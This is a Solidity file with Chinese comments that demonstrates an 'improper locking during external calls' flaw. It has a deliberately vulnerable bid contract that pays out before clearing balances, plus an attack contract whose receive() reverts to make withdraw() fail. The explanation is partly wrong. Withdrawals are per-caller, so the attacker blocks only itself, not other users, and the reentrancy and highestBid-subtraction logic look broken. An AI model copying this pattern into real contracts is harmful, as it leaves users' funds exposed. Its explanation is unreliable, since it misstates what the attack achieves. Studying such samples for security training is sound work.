// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
   漏洞說明：
   Improper locking during external calls
   此範例合約在 withdraw() 函式中，於外部呼叫（transfer）之前未正確更新狀態，
   如果外部呼叫的合約利用 fallback 與 receive 函式故意 revert，會造成整個 withdraw() 交易失敗，
   導致 Denial of Service 的問題。
   此外，狀態變數 pendingReturns 在外部呼叫後才更新，容易產生 reentrancy 或死鎖風險。
*/

contract BidVulnerable {
    // 最高出價者與出價額 (vulnerable 狀態變數)
    address public highestBidder;
    uint public highestBid;
    
    // 記錄各地址的可提領餘額
    mapping(address => uint) public pendingReturns;

    // 漏洞 withdraw 函式：外部呼叫前未更新狀態
    function withdraw() public {
        uint amount = pendingReturns[msg.sender];
        require(amount > 0, "No pending returns");
        
        // 以下兩行為漏洞重點：
        // 外部呼叫先於狀態變數更新進行，若目標合約的 fallback 反悔， withdraw() 將完全失敗
        if (msg.sender != highestBidder) {
            // 呼叫外部合約，可能引發 reentrancy 或因 fallback revert 而導致整個 withdraw() 失敗
            payable(msg.sender).transfer(amount);
        } else {
            payable(msg.sender).transfer(amount - highestBid);
        }
        
        // 狀態更新在外部呼叫後，可能由於外部呼叫失敗而無法被執行
        pendingReturns[msg.sender] = 0;
    }

    // 接收 ETH 的 fallback 函式
    receive() external payable {}
}

/*
   攻擊合約：
   攻擊者部署此合約並將地址傳入建構子，當 BidVulnerable 的 withdraw() 被呼叫時，
   攻擊合約的 fallback 會故意 revert，導致 withdraw() 操作失敗，使得其他使用者無法提領款項
   造成 Denial of Service 問題。
*/

contract AttackVulnerable {
    BidVulnerable public bidContract;

    // 修改建構子參數為 address payable 以符合轉換要求
    constructor(address payable _bidContract) {
        bidContract = BidVulnerable(_bidContract);
    }

    // fallback 函式，刻意 revert 阻斷轉帳動作
    receive() external payable {
        revert("Attack contract rejects funds");
    }

    // 攻擊者可以觸發 withdraw，證明攻擊成功
    function attackWithdraw() public {
        bidContract.withdraw();
    }
}
